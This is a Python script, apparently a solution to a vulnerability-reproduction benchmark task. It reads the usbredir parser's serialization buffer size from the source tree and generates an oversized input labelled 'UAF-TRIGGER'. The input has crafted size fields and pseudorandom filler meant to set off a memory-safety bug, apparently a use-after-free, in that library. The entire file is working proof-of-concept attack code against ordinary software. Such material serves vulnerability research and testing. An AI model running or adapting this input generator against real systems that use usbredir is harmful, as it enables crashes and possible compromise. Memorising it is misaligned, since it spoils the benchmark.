import os
import re
import tarfile
import ast
import struct
from typing import Optional, Iterable


class Solution:
    def _safe_int_eval(self, expr: str) -> Optional[int]:
        expr = expr.strip()
        if not expr:
            return None
        expr = re.sub(r"/\*.*?\*/", "", expr, flags=re.S)
        expr = re.sub(r"//.*", "", expr)
        expr = expr.strip()
        if not expr:
            return None

        if not re.fullmatch(r"[0-9a-fA-FxX\s\(\)\+\-\*/%<>&\^\|~]+", expr):
            return None

        expr = re.sub(r"\b([0-9]+)\s*[uUlL]+\b", r"\1", expr)

        try:
            node = ast.parse(expr, mode="eval")
        except SyntaxError:
            return None

        allowed_binops = (
            ast.Add,
            ast.Sub,
            ast.Mult,
            ast.FloorDiv,
            ast.Div,
            ast.Mod,
            ast.LShift,
            ast.RShift,
            ast.BitOr,
            ast.BitAnd,
            ast.BitXor,
        )
        allowed_unops = (ast.UAdd, ast.USub, ast.Invert)

        def _eval(n):
            if isinstance(n, ast.Expression):
                return _eval(n.body)
            if isinstance(n, ast.Constant):
                if isinstance(n.value, bool):
                    return int(n.value)
                if isinstance(n.value, int):
                    return int(n.value)
                return None
            if isinstance(n, ast.Num):  # py<3.8
                return int(n.n)
            if isinstance(n, ast.UnaryOp) and isinstance(n.op, allowed_unops):
                v = _eval(n.operand)
                if v is None:
                    return None
                if isinstance(n.op, ast.UAdd):
                    return +v
                if isinstance(n.op, ast.USub):
                    return -v
                if isinstance(n.op, ast.Invert):
                    return ~v
                return None
            if isinstance(n, ast.BinOp) and isinstance(n.op, allowed_binops):
                a = _eval(n.left)
                b = _eval(n.right)
                if a is None or b is None:
                    return None
                op = n.op
                try:
                    if isinstance(op, ast.Add):
                        return a + b
                    if isinstance(op, ast.Sub):
                        return a - b
                    if isinstance(op, ast.Mult):
                        return a * b
                    if isinstance(op, (ast.Div, ast.FloorDiv)):
                        if b == 0:
                            return None
                        return a // b
                    if isinstance(op, ast.Mod):
                        if b == 0:
                            return None
                        return a % b
                    if isinstance(op, ast.LShift):
                        if b < 0 or b > 63:
                            return None
                        return a << b
                    if isinstance(op, ast.RShift):
                        if b < 0 or b > 63:
                            return None
                        return a >> b
                    if isinstance(op, ast.BitOr):
                        return a | b
                    if isinstance(op, ast.BitAnd):
                        return a & b
                    if isinstance(op, ast.BitXor):
                        return a ^ b
                except Exception:
                    return None
                return None
            return None

        val = _eval(node)
        if val is None:
            return None
        if not isinstance(val, int):
            return None
        if val < 0:
            return None
        return val

    def _iter_source_texts(self, src_path: str) -> Iterable[str]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not fn.lower().endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".inl")):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        with open(p, "rb") as f:
                            data = f.read(1_000_000)
                        yield data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not name.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".inl")):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(1_000_000)
                        yield data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
        except Exception:
            return

    def _find_serialize_buf_size(self, src_path: str) -> int:
        macro = "USBREDIRPARSER_SERIALIZE_BUF_SIZE"
        define_re = re.compile(rf"^\s*#\s*define\s+{re.escape(macro)}\s+(.+?)\s*$", re.M)
        for txt in self._iter_source_texts(src_path):
            m = define_re.search(txt)
            if not m:
                continue
            expr = m.group(1).strip()
            expr = re.split(r"\s+//", expr, 1)[0].strip()
            expr = re.split(r"/\*", expr, 1)[0].strip()
            val = self._safe_int_eval(expr)
            if isinstance(val, int) and 1024 <= val <= 4 * 1024 * 1024:
                return val
        return 65536

    def _xorshift32_fill(self, buf: bytearray, start: int, seed: int = 0xA5F1523D) -> None:
        x = seed & 0xFFFFFFFF
        i = start
        n = len(buf)
        while i + 4 <= n:
            x ^= (x << 13) & 0xFFFFFFFF
            x ^= (x >> 17) & 0xFFFFFFFF
            x ^= (x << 5) & 0xFFFFFFFF
            buf[i:i + 4] = struct.pack("<I", x)
            i += 4
        while i < n:
            x ^= (x << 13) & 0xFFFFFFFF
            x ^= (x >> 17) & 0xFFFFFFFF
            x ^= (x << 5) & 0xFFFFFFFF
            buf[i] = x & 0xFF
            i += 1

    def solve(self, src_path: str) -> bytes:
        buf_size = self._find_serialize_buf_size(src_path)
        target_len = max(buf_size + 8192 + 512, 70000)
        target_len = min(target_len, 200000)

        out = bytearray(target_len)

        prefix = b""
        prefix += b"\x04\x00\x01\x00"  # 0x00010004: small as byte/word, large as dword
        prefix += b"\x00\x00\x01\x00"  # 0x00010000
        prefix += b"\x10\x00\x00\x00"  # 16
        prefix += b"\x08\x00\x00\x00"  # 8
        prefix += b"UAF-TRIGGER\x00\x00\x00\x00\x00"
        prefix = prefix[: min(len(prefix), len(out))]
        out[: len(prefix)] = prefix

        self._xorshift32_fill(out, len(prefix), seed=0xC3A5C85C)

        return bytes(out)